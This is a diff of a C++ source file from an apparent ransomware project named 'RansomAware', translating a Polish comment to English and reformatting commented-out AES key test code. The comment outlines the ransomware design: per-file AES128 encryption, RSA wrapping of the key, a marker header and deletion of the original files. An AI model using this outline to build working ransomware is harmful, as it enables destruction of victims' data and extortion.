@@ -9,17 +9,17 @@
 #include <iostream>
 #include <chrono>
 
-//funkcjonalnoœæ tego modu³u szyfrowania:
-/*
-zaszyfruje wszystkie pliki w podanej lokalizacji w ten sposób, ¿e dla ka¿dego oryginalnego pliku:
-    1) wygeneruje klucz AES128 i IV, (funkcja generateAESKeys())
-    2) stworzy nowy plik z nazw¹ oryginalnego pliku i rozszerzeniem .raf (funkcja encryptFile(std::string filePath))
-    3) na pocz¹tek nowego pliku do³¹czy ci¹g "!RansomAware!" (funkcja encryptFile(std::string filePath))
-    4) odczyta ca³y oryginalny plik i zaszyfruje odczytane dane kluczem AES128 (funkcja encryptFile(std::string filePath))
-    5) zaszyfruje klucz AES128 kluczem publicznym m_rsaKey (funkcja encryptAESKey())
-    6) dopisze do nowego pliku zaszyfrowany klucz AES128 (funkcja encryptFile(std::string filePath))
-    7) dopisze zaszyfrowane oryginalne dane do utworzonego w pkt. 4) pliku (funkcja encryptFile(std::string filePath))
-    g) usunie oryginalny plik (funkcja encryptFile(std::string filePath))
+/* Functionality of this encryption module:
+
+It will encrypt all files in the given location in such a way that for each original file:
+    1) It will generate an AES128 key and IV (using the function generateAESKeys()).
+    2) It will create a new file with the name of the original file and a .RAF! (RansomAwareFile!) extension (using the function encryptFile()).
+    3) At the beginning of the new file, it will append the string "!RansomAware!" (using the function encryptFile()).
+    4) It will read the entire original file and encrypt the read data with the AES128 key (using the function encryptFile()).
+    5) It will encrypt the AES128 key with the public key m_rsaKey (using the function encryptAESKey()).
+    6) It will append the encrypted AES128 key to the new file (using the function encryptFile()).
+    7) It will append the encrypted original data to the file created in step 4 (using the function encryptFile()).
+    8) It will delete the original file (using the function encryptFile()).
 */
 
 int main(int argc, char* argv[])
@@ -80,25 +80,25 @@ int main(int argc, char* argv[])
 #pragma region AES_TEST
 
     //Generate AES key
- //   CryptoKeyManager::AESKey aes;
- //   if (not keyMgr.generateAESKey(&aes))
- //   {
+    //CryptoKeyManager::AESKey aes;
+    //if (not keyMgr.generateAESKey(&aes))
+    //{
 	//	DBG_PRINT("Cannot generate AES key");
 	//	utils::stopAndExit(EXIT_FAILURE);
 	//}
 
     //Encrypt AES key
- //   DBG_PRINT("Generated AES [encrypted: %d]: ", aes.isEncrypted());
- //   std::cout << aes << std::endl;
+    //DBG_PRINT("Generated AES [encrypted: %d]: ", aes.isEncrypted());
+    //std::cout << aes << std::endl;
 
- //   if (not keyMgr.encryptAESKey(&aes))
- //   {
+    // if (not keyMgr.encryptAESKey(&aes))
+    //{
 	//	DBG_PRINT("Cannot encrypt AES key");
 	//	utils::stopAndExit(EXIT_FAILURE);
 	//}
 
- //   DBG_PRINT("Encrypted AES [encrypted: %d]: ", aes.isEncrypted());
- //   std::cout << aes << std::endl;
+    //DBG_PRINT("Encrypted AES [encrypted: %d]: ", aes.isEncrypted());
+    //std::cout << aes << std::endl;
 
     //Decrypt AES key
     //if (not keyMgr.decryptAESKey(&aes))
